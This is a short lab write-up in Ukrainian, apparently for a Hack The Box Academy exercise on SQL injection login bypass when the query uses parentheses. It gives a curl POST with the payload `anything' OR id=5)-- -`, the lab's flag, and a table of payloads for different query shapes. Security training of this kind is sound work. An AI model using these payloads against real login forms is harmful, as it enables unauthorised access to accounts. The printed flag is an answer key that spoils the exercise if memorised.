# SQL Injection — Auth Bypass with Parentheses (OR id=N)

## Модуль
[SQL Injection Fundamentals — Auth Bypass with OR](https://academy.hackthebox.com/app/module/33/section/799)

## Концепція

Вразливий запит має вкладені дужки:
```sql
SELECT * FROM logins WHERE (username='INPUT' AND id > 1) AND password='HASH';
```

Треба закрити дужку і додати умову через `OR`:
```sql
SELECT * FROM logins WHERE (username='x' OR id=5)-- -' AND id > 1) AND password='...';
```

## Команда

```bash
curl -s -X POST http://TARGET:PORT/ \
  -d "username=anything' OR id=5)-- -&password=anything"
```

**Flag:** `cdad9ecdf6f14b45ff5c4de32909caec`

## Логіка побудови payload
Оригінальний WHERE: (username='INPUT' AND id > 1)
↑
вставляємо після username

Payload: anything' OR id=5)-- -

Результат: (username='anything' OR id=5)-- - AND id > 1)...
└─────────────────────────────┘
виконується це
решта закоментована

## Алгоритм підбору payload при наявності дужок
1 Визначити структуру запиту — дивитись на error або видиму query
2 Порахувати кількість відкритих дужок до injection point
3 Закрити рівно стільки ж дужок у payload
4 Додати OR умову
5 Закоментувати залишок -- -

| Структура | Payload |
|-----------|---------|
| `WHERE username='X'` | `X'-- -` |
| `WHERE (username='X')` | `X')-- -` |
| `WHERE (username='X' AND id>1)` | `X' OR 1=1)-- -` |
| `WHERE (username='X' AND id>1) AND pass=` | `X' OR id=5)-- -` |
